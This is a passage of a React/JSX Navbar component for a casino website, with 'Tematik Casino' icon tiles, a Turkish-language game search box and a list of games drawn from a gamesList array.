              <svg xmlns="http://www.w3.org/2000/svg" xmlnsXlink="http://www.w3.org/1999/xlink" version="1.1" id="Layer_1" x="0px" y="0px" viewBox="0 0 500 500" xmlSpace="preserve" className="w-8 h-8"> <g> <path style={{fill:'none', stroke:'#FFFFFF', strokeWidth:'15.9717', strokeMiterlimit:'10'}} d="M309.1,312.2l-155.7,63.1 c-4,1.6-8.8,0-10.4-4L59.1,163.7c-1.6-4,0-8.8,4-10.4l155.7-63.1c4-1.6,8.8,0,10.4,4L313.8,301C315.4,305.8,313,309.8,309.1,312.2z "></path> <path style={{fill:'none', stroke:'#FFFFFF', strokeWidth:'15.9717', strokeMiterlimit:'10'}} d="M345.8,167.7l74.3,20c4,1.6,6.4,5.6,5.6,9.6 L360.2,412c-1.6,4-5.6,6.4-9.6,5.6l-171.7-49.5"></path> <path style={{fill:'none', stroke:'#FFFFFF', strokeWidth:'15.9717', strokeMiterlimit:'10'}} d="M242,111.8h95.8c4.8,0,8,3.2,8,8v223.6 c0,4.8-3.2,8-8,8H210"></path> <path style={{fill:'none', stroke:'#FFFFFF', strokeWidth:'15.9717', strokeLinecap:'round', strokeLinejoin:'round', strokeMiterlimit:'10'}} d=" M189.3,291.4c2.4-1.6,10.4-8,16.8-11.2c6.4-2.4,16.8-4,20-4"></path> <path style={{fill:'none', stroke:'#FFFFFF', strokeWidth:'15.9717', strokeLinecap:'round', strokeLinejoin:'round', strokeMiterlimit:'10'}} d=" M196.5,256.3c8.8,3.2,24-3.2,28.7-8.8c7.2-8,8.8-17.6,4-28c-8-20-50.3-20-60.7-31.9c1.6,16-28.7,44.7-20.8,65.5 c4,10.4,12,16,22.4,16.8C176.5,270.7,192.5,264.3,196.5,256.3z"></path> </g> </svg>
              <p className='text-[#ffffffa9] text-[11px]'> Tematik Casino</p>
            </div>
           
            <div className='flex flex-col w-full h-17 bg-[#1a1e17] rounded-md  items-center justify-center'>
              <svg xmlns="http://www.w3.org/2000/svg" xmlnsXlink="http://www.w3.org/1999/xlink" version="1.1" id="Layer_1" x="0px" y="0px" viewBox="0 0 500 500" xmlSpace="preserve" className="w-8 h-8"> <g> <path style={{fill:'none', stroke:'#FFFFFF', strokeWidth:'15.9717', strokeMiterlimit:'10'}} d="M309.1,312.2l-155.7,63.1 c-4,1.6-8.8,0-10.4-4L59.1,163.7c-1.6-4,0-8.8,4-10.4l155.7-63.1c4-1.6,8.8,0,10.4,4L313.8,301C315.4,305.8,313,309.8,309.1,312.2z "></path> <path style={{fill:'none', stroke:'#FFFFFF', strokeWidth:'15.9717', strokeMiterlimit:'10'}} d="M345.8,167.7l74.3,20c4,1.6,6.4,5.6,5.6,9.6 L360.2,412c-1.6,4-5.6,6.4-9.6,5.6l-171.7-49.5"></path> <path style={{fill:'none', stroke:'#FFFFFF', strokeWidth:'15.9717', strokeMiterlimit:'10'}} d="M242,111.8h95.8c4.8,0,8,3.2,8,8v223.6 c0,4.8-3.2,8-8,8H210"></path> <path style={{fill:'none', stroke:'#FFFFFF', strokeWidth:'15.9717', strokeLinecap:'round', strokeLinejoin:'round', strokeMiterlimit:'10'}} d=" M189.3,291.4c2.4-1.6,10.4-8,16.8-11.2c6.4-2.4,16.8-4,20-4"></path> <path style={{fill:'none', stroke:'#FFFFFF', strokeWidth:'15.9717', strokeLinecap:'round', strokeLinejoin:'round', strokeMiterlimit:'10'}} d=" M196.5,256.3c8.8,3.2,24-3.2,28.7-8.8c7.2-8,8.8-17.6,4-28c-8-20-50.3-20-60.7-31.9c1.6,16-28.7,44.7-20.8,65.5 c4,10.4,12,16,22.4,16.8C176.5,270.7,192.5,264.3,196.5,256.3z"></path> </g> </svg>
              <p className='text-[#ffffffa9] text-[11px]'> Tematik Casino</p>
            </div>
           
        </div>
    
         {/* Menu Right Side */}
        <div className='flex  flex-3 flex-col h-full gap-2 '>
           {/* Search Input */}
           <div className='w-full h-12 bg-[#1a1e17] rounded-md flex items-center px-3 gap-4'>
             {/* Search Icon */}
             <svg 
               xmlns="http://www.w3.org/2000/svg" 
               className="w-5 h-5 text-gray-400" 
               fill="none" 
               viewBox="0 0 24 24" 
               stroke="currentColor"
             >
               <path 
                 strokeLinecap="round" 
                 strokeLinejoin="round" 
                 strokeWidth={2} 
                 d="M21 21l-6-6m2-5a7 7 0 11-14 0 7 7 0 0114 0z" 
               />
             </svg>
             
             {/* Input Field */}
             <input
               type="text"
               placeholder="Oyun İsmi Ara"
               className="flex-1 bg-transparent text-gray-300 placeholder-gray-400 outline-none text-xs "
             />
             
             {/* Close Icon */}
             <svg 
               xmlns="http://www.w3.org/2000/svg" 
               className="w-5 h-5 text-gray-400 cursor-pointer hover:text-gray-300 transition-colors" 
               fill="none" 
               viewBox="0 0 24 24" 
               stroke="currentColor"
             >
               <path 
                 strokeLinecap="round" 
                 strokeLinejoin="round" 
                 strokeWidth={2} 
                 d="M6 18L18 6M6 6l12 12" 
               />
             </svg>
           </div>
          
           <div className='flex flex-col gap-1 w-full h-full bg-[#1a1e17] rounded-md p-3 overflow-y-auto'>
             {gamesList.map((game) => (
               <div 
                 key={game.id} 
                 className="flex items-center gap-2  hover:bg-[#252922] rounded-md transition-colors cursor-pointer"
               >
                 <div className="flex-shrink-0 w-[35px] h-[35px] flex items-center justify-center">
                   <Image 
                     src={game.image} 
                     alt={game.name} 
                     className={`${game.imageWidth} h-auto object-contain`} 
                   />
                 </div>
                 <p className='text-[#ffffffba] text-xs'>{game.name}</p>
               </div>
             ))}
           </div>


        </div>
     
    
       
        
      </div>
    </div>
    </>
  )
}

export default Navbar
